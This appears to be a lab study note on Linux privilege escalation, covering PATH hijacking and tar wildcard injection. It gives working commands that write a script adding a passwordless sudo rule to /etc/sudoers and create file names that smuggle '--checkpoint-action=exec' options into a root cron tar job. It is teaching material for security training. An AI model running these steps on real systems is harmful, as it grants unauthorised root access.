# Content 
- [Environment-based Privilege Escalation](#environment-based-privilege-escalation)

## Environment-based Privilege Escalation

### Path Abuse
we could replace a common binary such as ls with a malicious script such as a reverse shell.

```shell
$ PATH=.:${PATH}
$ export PATH
$ echo $PATH
```

### Wildcard Abuse
- [Linux-PrivEsc-Wildcard](https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/)

| Character | Significance                                                   |
|-----------|----------------------------------------------------------------|
| *         | An asterisk that can match any number of characters in a file name. |
| ?         | Matches a single character.                                    |
| [ ]       | Brackets enclose characters and can match any single one at the defined position. |
| ~         | A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory. |
| -         | A hyphen within brackets will denote a range of characters.   |


#### EX: privilege escalation in tar

- cron job
```shell
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```
- By creating files with these names, when the wildcard is specified, --checkpoint=1 and --checkpoint-action=exec=sh root.sh is passed to tar as command-line options.
```
$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
$ echo "" > "--checkpoint-action=exec=sh root.sh"
$ echo "" > --checkpoint=1

```

- check the dir , now when the job executed it will run our script  
```shell
$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```
